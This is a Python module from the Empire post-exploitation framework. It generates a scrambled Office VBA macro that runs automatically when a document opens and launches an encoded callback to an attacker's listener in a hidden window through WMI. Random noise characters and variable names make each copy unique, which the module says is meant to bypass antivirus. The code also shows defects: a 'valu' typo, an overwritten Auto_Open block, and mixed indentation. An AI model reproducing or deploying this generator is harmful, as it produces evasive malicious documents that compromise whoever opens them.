from lib.common import helpers
import random
import random, string

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Scrambled_Macro',

            'Author': ['@enigma0x3', '@harmj0y', 'Rob Schoemaker'],

            'Description': ('Generates a scrambled office macro for Empire, compatible with office 97-2003, and 2007 file types.\nEach generated macro is unique in order to bypass AV.'),

            'Comments': [
                'http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'OutFile' : {
                'Description'   :   'File to output macro to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   '/tmp/scrambled'
            },
            'NoiseLevel' : {
                'Description'   :   'Sets the amount of noise to add (default=3, 0=no noise)',
                'Required'      :   True,
                'Value'         :   '3'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = valu

    def addnoise(self, payload,level=1):
        charset='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-+={}[];:|,.<>?~_'
        noisechars=''

        for character in charset:
            if(not character in payload):
                noisechars += character

        scrambledpayload = ''

        random.seed()

        shuffled = "".join(random.sample(noisechars, len(noisechars)))
        noisechars = shuffled

        for character in payload:
            action = random.randint(0,level)
            while(action!=0):
                scrambledpayload += random.choice(noisechars)
                action = random.randint(0,level)
            scrambledpayload += character

        return scrambledpayload, noisechars

    def generate(self):

        # extract all of our options
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']
        noiselevel = int(self.options['NoiseLevel']['Value'])

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
		
        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:	   
	    LengthOfVari = random.randint(1,35)
	    LengthOfChunks = random.randint(1,100)
		
            launcher, noise = self.addnoise(launcher, noiselevel)
            chunks = list(helpers.chunks(launcher, LengthOfChunks))
		
            Str = ''.join(random.choice(string.letters) for i in range(LengthOfVari))
            NoiseMacVari = ''.join(random.choice(string.letters) for i in range(LengthOfVari))
            Counter = ''.join(random.choice(string.letters) for i in range(LengthOfVari))
            Method=''.join(random.choice(string.letters) for i in range(LengthOfVari))
            strComputer=''.join(random.choice(string.letters) for i in range(LengthOfVari))
		
            payload = "\tDim "+Str+" As String\n"
            payload += "\tDim "+NoiseMacVari+" As String\n"
            payload += "\tDim "+Counter+" As Integer\n"
            payload += "\t"+NoiseMacVari+" = \"" + noise + "\"\n"
            payload += "\t"+Str+" = \"" + str(chunks[0]) + "\"\n"
	
            for chunk in chunks[1:]:
                payload += "\t"+Str+" = "+Str+" + \"" + str(chunk) + "\"\n"

            payload += "\tFor "+Counter+" = 1 to len("+NoiseMacVari+")\n"
            payload += "\t"+Str+" = replace("+Str+",mid("+NoiseMacVari+","+Counter+",1),\"\")\n"
            payload += "\tNext\n"

            macro = "Sub Auto_Open()\n"
            macro += "\t"+Method+"\n"
            macro += "End Sub\n\n"
            macro = "Sub AutoOpen()\n"
            macro += "\t"+Method+"\n"
            macro += "End Sub\n\n"

            macro += "Sub Document_Open()\n"
            macro += "\t"+Method+"\n"
            macro += "End Sub\n\n"

            macro += "Public Function "+Method+"() As Variant\n"
            macro += payload
            macro += "\tConst HIDDEN_WINDOW = 0\n"
            macro += "\t"+strComputer+" = \".\"\n"
            macro += "\tSet objWMIService = GetObject(\"winmgmts:\\\\\" & "+strComputer+" & \"\\root\\cimv2\")\n"
            macro += "\tSet objStartup = objWMIService.Get(\"Win32_ProcessStartup\")\n"
            macro += "\tSet objConfig = objStartup.SpawnInstance_\n"
            macro += "\tobjConfig.ShowWindow = HIDDEN_WINDOW\n"
            macro += "\tSet objProcess = GetObject(\"winmgmts:\\\\\" & "+strComputer+" & \"\\root\\cimv2:Win32_Process\")\n"
            macro += "\tobjProcess.Create "+Str+", Null, objConfig, intProcessID\n"
            macro += "End Function\n"
            	    
 	    return macro
